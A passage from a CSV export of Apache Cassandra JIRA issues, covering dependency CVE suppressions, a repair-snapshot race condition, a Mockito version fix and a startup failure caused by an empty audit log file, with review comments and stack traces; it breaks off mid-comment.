CI,,,,,"17/Oct/22 15:41;brandon.williams;CVE-2022-42004 looks like we can suppress:
{quote}
In FasterXML jackson-databind before 2.13.4, resource exhaustion can occur because of a lack of a check in BeanDeserializer._deserializeFromArray to prevent use of deeply nested arrays. An application is vulnerable only with certain customized choices for deserialization.
{quote}

CVE-2022-42003 looks quite similar:
{quote}
In FasterXML jackson-databind before 2.14.0-rc1, resource exhaustion can occur because of a lack of a check in primitive value deserializers to avoid deep wrapper array nesting, when the UNWRAP_SINGLE_VALUE_ARRAYS feature is enabled. 
{quote}

I don't think either of these are worth upgrading for and I'm not keen on upgrading to an RC version anyway, so patches to suppress:

||Branch||CI||
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17966-3.11]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/665/workflows/b647a7bb-fc55-4022-881d-a31731258ee2]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17966-4.0]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/667/workflows/40d9af0c-ba79-4482-a1d8-f9c7f81441f4]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17966-4.1]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/664/workflows/e55f85c0-63d4-420c-8f4a-3ea94fa88fd5]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17966-trunk]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/666/workflows/dfeb2502-8e51-4f1a-86fb-112a817ed2b5]
;;;","18/Oct/22 15:21;smiklosovic;Given this just suppresses CVE and doesn't have any impact on the code as such, I am +1 even though CI runs are quite ugly but what I saw it is mostly just flakies and timeouts in action.;;;","18/Oct/22 15:40;brandon.williams;Thanks, committed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cassandra-driver-core vulnerability CVE-2019-2684,CASSANDRA-17965,13486647,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,17/Oct/22 14:50,18/Oct/22 16:21,13/Jul/23 08:40,18/Oct/22 16:21,3.0.28,3.11.14,4.0.7,4.1-rc1,5.0,,Dependencies,,,,0,,"As the summary says, CVE-2019-2684 affects cassandra-driver-core including both versions we use, 3.0.1 and 3.11.0.",,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Oct 18 16:21:37 UTC 2022,,,,,,,All,,,,"0|z19ffk:",9223372036854775807,,,,stefan.miklosovic,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/3d4e6944ef11d96858507779b9280f5b9c198ffa,,,,,,,,,run CI,,,,,"17/Oct/22 16:07;brandon.williams;CVE-2019-2684 is a [JRE vulnerability|https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2684] that requires upgrading java.  I'm not sure why the driver is getting flagged (especially at this point in time) but all we can do is suppress.

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17965-3.0]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/668/workflows/bd7d5a5f-07fe-439d-bd49-37df4c6803d4]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17965-3.11]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/671/workflows/fc7b9c12-861b-48d6-9100-3774bd8f1fd9]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17965-4.0]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/672/workflows/088b994e-66fe-4fef-9dca-03bc72fbccf4]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17965-4.1]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/670/workflows/f69b12b1-71ae-43e0-a441-cdb9fbe16da6]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17965-trunk]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/669/workflows/17fb4724-a0f0-4672-8453-71929bb96157]|

;;;","18/Oct/22 15:26;smiklosovic;+1, tests are flakies / timeouts.;;;","18/Oct/22 16:21;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Race condition on repair snapshots,CASSANDRA-17955,13485353,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,cam1982,cam1982,10/Oct/22 00:39,22/Nov/22 15:42,13/Jul/23 08:40,27/Oct/22 14:52,4.0.8,4.1,4.1-rc1,5.0,,,Consistency/Repair,Local/Snapshots,,,1,4.0,"If an endpoint is convicted and that endpoint is a coordinator then ActiveRepairService::removeParentRepairSession is called.

The issue is that this occurs on clearSnapshotExecutor and can happen while RepairMessageVerbHandler is in process of taking a snapshot. So then you get a race condition and clearSnapshot will throw a java.nio.file.DirectoryNotEmptyException

 
{code:java}
public static void deleteRecursiveWithThrottle(File dir, RateLimiter rateLimiter)
{
    if (dir.isDirectory())
    {
        String[] children = dir.list();
        for (String child : children)
            deleteRecursiveWithThrottle(new File(dir, child), rateLimiter);
    }

    // The directory is now empty so now it can be smoked
    deleteWithConfirmWithThrottle(dir, rateLimiter);
} {code}
Due to the directory not being empty when it goes to remove the directory at the end.",,cam1982,dcapwell,maedhroz,marcuse,miklosovic@pm.me,paulo,smiklosovic,,,,,,,,"smiklosovic opened a new pull request, #1903:
URL: https://github.com/apache/cassandra/pull/1903

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;10/Oct/22 10:56;githubbot;600","smiklosovic commented on code in PR #1903:
URL: https://github.com/apache/cassandra/pull/1903#discussion_r991169713


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -198,10 +198,10 @@ public static ThreadPoolExecutor repairCommandExecutor()
     private final Gossiper gossiper;
     private final Cache<Integer, Pair<ParentRepairStatus, List<String>>> repairStatusByCmd;
 
-    private final DebuggableThreadPoolExecutor clearSnapshotExecutor = DebuggableThreadPoolExecutor.createWithMaximumPoolSize(""RepairClearSnapshot"",

Review Comment:
   I renamed this executor as it is not only clearing snapshots anymore. Also I had to make it public to call it from outside, obviously.



;10/Oct/22 11:11;githubbot;600","dcapwell commented on code in PR #1903:
URL: https://github.com/apache/cassandra/pull/1903#discussion_r991644746


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -198,10 +198,10 @@ public static ThreadPoolExecutor repairCommandExecutor()
     private final Gossiper gossiper;
     private final Cache<Integer, Pair<ParentRepairStatus, List<String>>> repairStatusByCmd;
 
-    private final DebuggableThreadPoolExecutor clearSnapshotExecutor = DebuggableThreadPoolExecutor.createWithMaximumPoolSize(""RepairClearSnapshot"",

Review Comment:
   given this is a `DebuggableThreadPoolExecutor` the name would have been exposed via JMX, so renaming the string could be a regression if we released that name.



;10/Oct/22 21:17;githubbot;600","smiklosovic commented on code in PR #1903:
URL: https://github.com/apache/cassandra/pull/1903#discussion_r991913197


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -198,10 +198,10 @@ public static ThreadPoolExecutor repairCommandExecutor()
     private final Gossiper gossiper;
     private final Cache<Integer, Pair<ParentRepairStatus, List<String>>> repairStatusByCmd;
 
-    private final DebuggableThreadPoolExecutor clearSnapshotExecutor = DebuggableThreadPoolExecutor.createWithMaximumPoolSize(""RepairClearSnapshot"",

Review Comment:
   @dcapwell where are they exposed? Are not only `JMXEnabledThreadPoolExecutor`s exposed to a user?



;11/Oct/22 07:31;githubbot;600","dcapwell commented on code in PR #1903:
URL: https://github.com/apache/cassandra/pull/1903#discussion_r1002167754


##########
src/java/org/apache/cassandra/service/ActiveRepairService.java:
##########
@@ -198,10 +198,10 @@ public static ThreadPoolExecutor repairCommandExecutor()
     private final Gossiper gossiper;
     private final Cache<Integer, Pair<ParentRepairStatus, List<String>>> repairStatusByCmd;
 
-    private final DebuggableThreadPoolExecutor clearSnapshotExecutor = DebuggableThreadPoolExecutor.createWithMaximumPoolSize(""RepairClearSnapshot"",

Review Comment:
   yes you are right, `JMXEnabledThreadPoolExecutor` exposes but this doesn't.



;21/Oct/22 20:36;githubbot;600","smiklosovic closed pull request #1903: CASSANDRA-17955 
URL: https://github.com/apache/cassandra/pull/1903


;27/Oct/22 16:52;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3600,,,0,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Oct/22 23:10;miklosovic@pm.me;signature.asc;https://issues.apache.org/jira/secure/attachment/13050262/signature.asc",,,,,1.0,smiklosovic,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Oct 27 13:15:20 UTC 2022,,,,,,,All,,,,"0|z197hs:",9223372036854775807,,,,,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/35ef5b99577ef8b04b8d4b326154775f510ade42,,,,,,,,,ci,,,,,"10/Oct/22 11:03;smiklosovic;This might be the solution (1). Basically, we need to make sure that a new snapshot is not taken until old snapshot is cleared. Snapshot name is UUID.toString() of ""parentSessionId"". Executor in ActiveRepairService is running snapshot cleanup in a non-blocking way. That executor can run 1 thread only at any given time. 

CassandraTableRepairManager takes an emphemeral snapshot and it might race in ActiveRepairService as a snapshot is being cleared but it expects the directory to be empty - but it is not, because CassandraTableRepairManager created a snapshot in it. 

(1) https://github.com/apache/cassandra/pull/1903/files;;;","10/Oct/22 11:06;smiklosovic;[~marcuse] [~dcapwell] would you mind to take a look? I see you were involved in that part of the code lastly via git blame.

This is reported to be quite a big issue, we have a case of 200 nodes cluster where 80 nodes across 3 dcs hit this problem.

Having this in 4.1 GA would be really great. Isn't this actually a blocker?;;;","10/Oct/22 20:47;smiklosovic;https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1990/;;;","10/Oct/22 21:19;dcapwell;Patch makes sense to me, we have a single threaded executor that would do cleanup, but now also added snapshot, so this avoids the 2 actions overlapping...

I am not sure how I feel about snapshots now being single threaded...  this could be an issue for some users maybe... need to think more about it.

[~smiklosovic] can you add a test to replicate the race condition?  ;;;","10/Oct/22 23:10;miklosovic@pm.me;I do not have a reproducer yet. I will try to do one but my gut feeling is that it wont be so easy. I checked the tests and I think you did one for repairs when one node went down. I might take that as a base and refactor it maybe.


Sent from ProtonMail mobile



\;;;","13/Oct/22 10:31;smiklosovic;[~dcapwell] I am letting you know that I am not trying to develop the reproducer at the moment. I think we need to go without if somebody else does not write it.;;;","21/Oct/22 09:37;smiklosovic;[~dcapwell] any progress here? Have you been thinking about consequences of having single threaded snapshots during repairs?;;;","21/Oct/22 20:37;dcapwell;I don't see any other than its slow if you try to do a lot at once... so LGTM

+1;;;","21/Oct/22 20:41;brandon.williams;Snaps are just hard links so it should still be sufficiently fast imo.;;;","21/Oct/22 22:48;cam1982;So clearSnapshotExecutor was added as part of CASSANDRA-17168 . Instead of adding more tasks to this executor why not pass it back to 

ANTI_ENTROPY stage. Snapshotting messages already take place through this stage, and I think its cleaner and makes more sense to clear the snapshot there. Note this stage already is only 1 thread so concerns about single threaded snapshots has always been the case. As [~brandon.williams] mentioned its mostly just hard linking (other then it having to block for a flush). The argument for having more threads could be made but I think that is seperate to getting clearing and creating snapshots happening in the same thread pool.;;;","21/Oct/22 23:24;cam1982;Tagging [~marcuse] since you are author of CASSANDRA-17168 ;;;","24/Oct/22 11:46;marcuse;Haven't looked at this in detail, but purpose of 17168 was just to avoid doing this on GossipTasks, so as long as its not there we're fine;;;","25/Oct/22 11:10;smiklosovic;I run pipeline with the proposed approach (running it in Stage) and while it seems to be ok in 4.0, it does not work in 4.1, there are dozens of errors, reproducible locally too. It seems like it is stuck and then it just timeouts. 

I do not have a lot of time to investigate what is going on here, I run the original patch and passes the pipeline just fine so I will go with that one.

I ll formally prepare all the branches and builds and merge the original and already approved approach.;;;","26/Oct/22 12:14;smiklosovic;4.0
j11 precommit https://app.circleci.com/pipelines/github/instaclustr/cassandra/1488/workflows/02fccb66-30fb-4ce3-ac75-6f275221af94
j8 precommit https://app.circleci.com/pipelines/github/instaclustr/cassandra/1488/workflows/08e02b33-6be5-4de9-8801-f725077bdca1
4.1
j11 precommit https://app.circleci.com/pipelines/github/instaclustr/cassandra/1487/workflows/ad3a7fb8-c84d-48d7-ae0c-6094cc6a1a21
j8 precommit https://app.circleci.com/pipelines/github/instaclustr/cassandra/1487/workflows/d5c56237-776e-4f81-92be-87bec32cfe1a
trunk
j11 precommit  https://app.circleci.com/pipelines/github/instaclustr/cassandra/1486/workflows/9a714592-24e4-415a-951d-e143ec73ff50
j8 precommit https://app.circleci.com/pipelines/github/instaclustr/cassandra/1486/workflows/a1b9918c-e055-41b4-94c8-d47d90068aa1

Everything is green, I ve never seen 6 green builds in a row tbh.

What I want to do now is to do run 500x on all repair related tests (python dtests included).;;;","27/Oct/22 13:15;smiklosovic;As mentioned, I tried to run multiplexer on all repair tests, I can use only 20 runners and CI job timeouts after 1 hour so I tried to measure the maximum amount of repeats over all repair tests. I think I run all repair unit tests around 120 times and all dtests 20 times it went all fine. This is only the build of trunk (1).

This patch is not introducing any new test nor it modifies any but I still tried to run all repair tests in a loop to see if it is stable, which it seems it is. Due to limited resources and time constraints I consider this kind of testing enough (on top of regular and mandatory 6 jobs above, 2 per branch (8 and 11 pre-commit)

https://app.circleci.com/pipelines/github/instaclustr/cassandra/1498/workflows/e0f4e61a-cf3b-4ef7-a0c3-d02a25778bb8;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade back Mockito to 4.7.0 after CASSANDRA-17750,CASSANDRA-17946,13484323,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,e.dimitrova,e.dimitrova,e.dimitrova,03/Oct/22 20:32,03/Oct/22 23:39,13/Jul/23 08:40,03/Oct/22 23:39,5.0,,,,,,Build,,,,0,,"Update of ASM(9.1 to 9.3), Mockito(3.2.4 to 4.7.0) and ByteBuddy(1.10.10 to 1.12.13) happened in CASSANDRA-17835

It seems during rebase in the next commit some changes were discarded:

Mockito was downgraded back to 3.2.4.

We need to fix this. The other two dependencies are at the right version.

CC [~aratnofsky] , [~dcapwell] and [~mck] ",,aratnofsky,e.dimitrova,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17750,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,e.dimitrova,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Oct 03 23:39:00 UTC 2022,,,,,,,All,,,,"0|z1915s:",9223372036854775807,,,,aratnofsky,mck,,,Normal,,,,https://github.com/apache/cassandra/commit/719d1948df827e864ff66e44e22c7fad334c3100,,,,,,,,,"[Patch|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:trunk-17946?expand=1]. CI started [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=trunk-17946]

No new tests added, current CI to be validated",,,,,"03/Oct/22 20:40;e.dimitrova;[patch|https://github.com/apache/cassandra/compare/trunk...ekaterinadimitrova2:cassandra:trunk-17946?expand=1]. CI started [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=trunk-17946];;;","03/Oct/22 21:26;aratnofsky;Thanks for catching [~e.dimitrova] – that's unfortunate timing on the rebase. Patch LGTM.;;;","03/Oct/22 22:08;e.dimitrova;No worries, I can see how that quietly happened with the addition of the new separate pom files. :) 

Thank you for the review, I forgot to raise the resources and of course the Python tests ""exploded""

Second try [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=trunk-17946], #1975

 ;;;","03/Oct/22 22:10;mck;> mockito was downgraded back to 1.10.10.

think you mean mockito was downgraded back to 3.2.4;;;","03/Oct/22 22:10;mck;+1;;;","03/Oct/22 22:11;e.dimitrova;{quote}think you mean mockito was downgraded back to 3.2.4
{quote}
Definitely :) Corrected the description, thanks :) ;;;","03/Oct/22 23:26;e.dimitrova;There is only one known failure (CASSANDRA-17005), starting commit soon. ;;;","03/Oct/22 23:39;e.dimitrova;To https://github.com/apache/cassandra.git

   [35578a4a9f..719d1948df  trunk -> trunk|https://github.com/apache/cassandra/commit/719d1948df827e864ff66e44e22c7fad334c3100] 

Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Zero length file in Audit log folder, prevents a node from starting",CASSANDRA-17933,13483787,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,adhogg,adhogg,29/Sep/22 08:17,22/Nov/22 15:42,13/Jul/23 08:40,11/Oct/22 21:37,4.0.7,4.1,4.1-rc1,5.0,,,Local/Startup and Shutdown,,,,0,,"We have encountered a 4.0.3 cluster where the audit log folder had a zero byte length file within it after the node had stopped. It is not clear how Cassandra got to the point of this file existing. On restarting the node, the node will not start and throws the following stack trace.
{code:java}
ERROR [main] 2022-09-26 14:01:27,892 CassandraDaemon.java:911 - Exception encountered during startup
java.lang.ExceptionInInitializerError: null
        at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:468)
        at org.apache.cassandra.service.CassandraDaemon.activate(CassandraDaemon.java:765)
        at org.apache.cassandra.service.CassandraDaemon.main(CassandraDaemon.java:889)
Caused by: org.apache.cassandra.exceptions.ConfigurationException: Unable to create instance of IAuditLogger.
        at org.apache.cassandra.utils.FBUtilities.newAuditLogger(FBUtilities.java:686)
        at org.apache.cassandra.audit.AuditLogManager.getAuditLogger(AuditLogManager.java:95)
        at org.apache.cassandra.audit.AuditLogManager.<init>(AuditLogManager.java:74)
        at org.apache.cassandra.audit.AuditLogManager.<clinit>(AuditLogManager.java:60)
        ... 3 common frames omitted
Caused by: java.lang.reflect.InvocationTargetException: null
        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
        at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
        at org.apache.cassandra.utils.FBUtilities.newAuditLogger(FBUtilities.java:682)
        ... 6 common frames omitted
Caused by: java.nio.channels.OverlappingFileLockException: null
        at sun.nio.ch.SharedFileLockTable.checkList(FileLockTable.java:255)
        at sun.nio.ch.SharedFileLockTable.add(FileLockTable.java:152)
        at sun.nio.ch.FileChannelImpl.lock(FileChannelImpl.java:1068)
        at java.nio.channels.FileChannel.lock(FileChannel.java:1053)
        at net.openhft.chronicle.bytes.MappedFile.resizeRafIfTooSmall(MappedFile.java:369)
        at net.openhft.chronicle.bytes.MappedFile.acquireByteStore(MappedFile.java:307)
        at net.openhft.chronicle.bytes.MappedFile.acquireByteStore(MappedFile.java:269)
        at net.openhft.chronicle.bytes.MappedBytes.acquireNextByteStore0(MappedBytes.java:434)
        at net.openhft.chronicle.bytes.MappedBytes.readVolatileInt(MappedBytes.java:792)
        at net.openhft.chronicle.queue.impl.single.SingleChronicleQueue$StoreSupplier.headerRecovery(SingleChronicleQueue.java:1027)
        at net.openhft.chronicle.queue.impl.single.SingleChronicleQueue$StoreSupplier.acquire(SingleChronicleQueue.java:981)
        at net.openhft.chronicle.queue.impl.WireStorePool.acquire(WireStorePool.java:53)
        at net.openhft.chronicle.queue.impl.single.SingleChronicleQueue.cleanupStoreFilesWithNoData(SingleChronicleQueue.java:821)
        at net.openhft.chronicle.queue.impl.single.StoreAppender.<init>(StoreAppender.java:75)
        at net.openhft.chronicle.queue.impl.single.SingleChronicleQueue.newAppender(SingleChronicleQueue.java:422)
        at net.openhft.chronicle.core.threads.CleaningThreadLocal.initialValue(CleaningThreadLocal.java:54)
        at java.lang.ThreadLocal.setInitialValue(ThreadLocal.java:180)
        at java.lang.ThreadLocal.get(ThreadLocal.java:170)
        at net.openhft.chronicle.core.threads.CleaningThreadLocal.get(CleaningThreadLocal.java:59)
        at net.openhft.chronicle.queue.impl.single.SingleChronicleQueue.acquireAppender(SingleChronicleQueue.java:441)
        at org.apache.cassandra.utils.binlog.BinLog.<init>(BinLog.java:133)
        at org.apache.cassandra.utils.binlog.BinLog.<init>(BinLog.java:65)
        at org.apache.cassandra.utils.binlog.BinLog$Builder.build(BinLog.java:453)
        at org.apache.cassandra.audit.BinAuditLogger.<init>(BinAuditLogger.java:55)
        ... 11 common frames omitted {code}
To reproduce, we place a zero length file and attempted to start the node, and saw the same stack trace.
{code:java}
ll ../logs/audit/
total 4
rw-rw-r-. 1 automaton automaton 0 Sep 28 13:00 20220928-12.cq4
rw-rw-r-. 1 automaton automaton 131072 Sep 28 13:00 metadata.cq4t {code}",,adhogg,maedhroz,mck,miklosovic@pm.me,smiklosovic,,,,,,,,,,"smiklosovic merged PR #203:
URL: https://github.com/apache/cassandra-dtest/pull/203


;11/Oct/22 21:39;githubbot;600","smiklosovic closed pull request #1894: CASSANDRA-17933 remove empty cq4 log files to prevent BinLog from failing to start
URL: https://github.com/apache/cassandra/pull/1894


;12/Oct/22 19:10;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Oct/22 17:37;miklosovic@pm.me;signature.asc;https://issues.apache.org/jira/secure/attachment/13050254/signature.asc",,,,,1.0,smiklosovic,,,,,,,,,,,,,,Availability -> Process Crash,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Oct 11 19:06:03 UTC 2022,,,,,,,All,,,,"0|z18xvs:",9223372036854775807,,,,maedhroz,,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/488c0c75a8f632f2db4e3db39f2ebcf8a489971e,,,,,,,,,junits + dtest,,,,,"29/Sep/22 08:44;smiklosovic;After I looked into it briefly, it seems that Chronicle is trying to clean it first, check the stack trace closely:
 at net.openhft.chronicle.queue.impl.single.SingleChronicleQueue.cleanupStoreFilesWithNoData(SingleChronicleQueue.java:821)
Then it tries to acquire it in try-with-resources and there it fails on OverlappingFileLockException because it was already locked somewhere, it seems like it.

I am not sure what to do with it, it seems like it is bug in the library itself.

We could scan the dir and remove empty files in it before we create bin logger.;;;","29/Sep/22 10:07;adhogg;Just being thorough, I did have the file checked with lsof before the node started, and nothing else had it locked. The 2nd lock had to be coming from inside Cassandra.;;;","29/Sep/22 14:30;brandon.williams;Fairly simple to reproduce.  Maybe BinAuditLogger needs to call cleanDirectory the same as FullQueryLogger, similar to CASSANDRA-17136.;;;","30/Sep/22 17:52;smiklosovic;If I understand that correctly, the goal here is to clean directory on startup but we should not clean it while a node is running and we enable / disable it via JMX?

Cleaning a directory on startup and not in runtime makes sense to me. However, I would clean only empty log files (length = 0). I do not think that deletion of all the files is desirable, obviously.

I propose to implement clearing of empty files in BinLog.Builder#build(boolean) regardless of what ""cleanDirectory"" parameter of that method is. Basically every time we are going to create a logger, it would clean all empty files first.;;;","01/Oct/22 23:47;smiklosovic;This is what I have for 4.0 (will be applied to 4.1 and trunk too)

cassandra-4.0 patch [https://github.com/apache/cassandra/pull/1894]

cassandra-4.0 build [https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1964/]

The patch also backports what is in CASSANDRA-17595. I am not sure why it was fixed for 4.1 and trunk only, the issue in 17959 is present in 4.0 too. I noticed this while I was patching this issue.

The approach I took cleans empty cq4 files on every BinLog start. _cleaning of log dir_ is different from {_}cleaning empty cq4 files{_}. The former happens only explicitly on request, the latter happens every time when BinLog is about to be started because it just fails with empty cq4 files present.

I have also consolidated the cleanup methods and extracted common parts for reusability.

The related dtest is here https://github.com/apache/cassandra-dtest/pull/203

On general consensus what I am trying to do here I will prepare two remaining branches with builds.;;;","04/Oct/22 11:33;smiklosovic;[~maedhroz]  would you take a look at 4.0 branch, please? I see you are among the watchers.;;;","04/Oct/22 16:34;maedhroz;Sure, I'll read through the comments and take a look at the patch.;;;","04/Oct/22 19:33;maedhroz;[~smiklosovic] I've left some very minor comments in the PR, but the only thing I'm a little worried about is the interaction between the {{metadata.cq4t}} file and subordinate {{cq4}} files. Would it be possible to slightly expand {{AuditLoggerCleanupTest}} to ""empty"" a file that had previously been written and that the metadata file had been aware of (while ensuring that startup still could proceed normally afterward)? My lack of CQ expertise makes it hard for me to know how it would behave here...;;;","04/Oct/22 21:59;smiklosovic;[~maedhroz]

Yes, I can do such test. This is a valid point, actually. There is not a lot of information available online about the relationship between these two files. It seems like metadata.cq4t is ""static"". It does not change its size when new cq4 files are created (seems like it). The actual size and allocated size might be different though. (ls -la vs ls -ls) I will investigate if we are safe to delete it on a deeper level and I ll add that test you mentioned.

By the way, we do not know what has caused the creation of that empty file we try to delete. That bothers me too. ;;;","04/Oct/22 22:10;maedhroz;bq. By the way, we do not know what has caused the creation of that empty file we try to delete. That bothers me too.

I know, right? For now, it's probably the right trade-off to a.) not fail startup and b.) make sure we log clearly what we're doing (probably at WARN).;;;","05/Oct/22 13:28;smiklosovic;[~maedhroz] 

I debugged the behavior of metadata.cq4t + bin files a bit. This will be a little bit longer.

metadata.cq4t (metadata) are not immutable. It seems that the allocated size is same but its content is changing. One can dump the content of metadata and regular cq4 files (logs) by a class in ChronicleQueue called ""DumpMain"".

If we dump metadata via this, it prints something like this:
{code:java}
--- !!meta-data #binary
header: !STStore {
  wireType: !WireType BINARY_LIGHT,
  metadata: !SCQMeta {
    roll: !SCQSRoll { length: !short 1000, format: yyyyMMdd-HHmmss'T', epoch: 0 },
    deltaCheckpointInterval: 64,
    sourceId: 0
  }
}

--- !!data #binary
listing.highestCycle: 1664967434
--- !!data #binary
listing.lowestCycle: 1664965537
--- !!data #binary
listing.modCount: 3
--- !!data #binary
chronicle.write.lock: -9223372036854775808
--- !!data #binary
chronicle.append.lock: -9223372036854775808
--- !!data #binary
chronicle.lastIndexReplicated: -1
--- !!data #binary
chronicle.lastAcknowledgedIndexReplicated: -1

# 130596 bytes remaining
{code}
At the very beginning we see that that roll cycle is 1 second (1000 ms).

The most crucial fields are:

listing.highestCycle - that is unix timestamp from '70 which is equal to the time when the last bin log file was created
listing.lowestCycle - that is unix timestamp from '70 which is equal to the time when the first bin log file was created
listing.modCount - I do not know what ""mod"" stands for but here it is 3, this number is same as the number of bin log files (called ""cycles"" in ChronicleQueue terminology).

So, when fourth file is created, that modCount value is increased to 4 and so on.

On disk, it might look like this:
{code:java}
20221005-102537T.cq4 <-- listing.lowestCycle
20221005-102937T.cq4
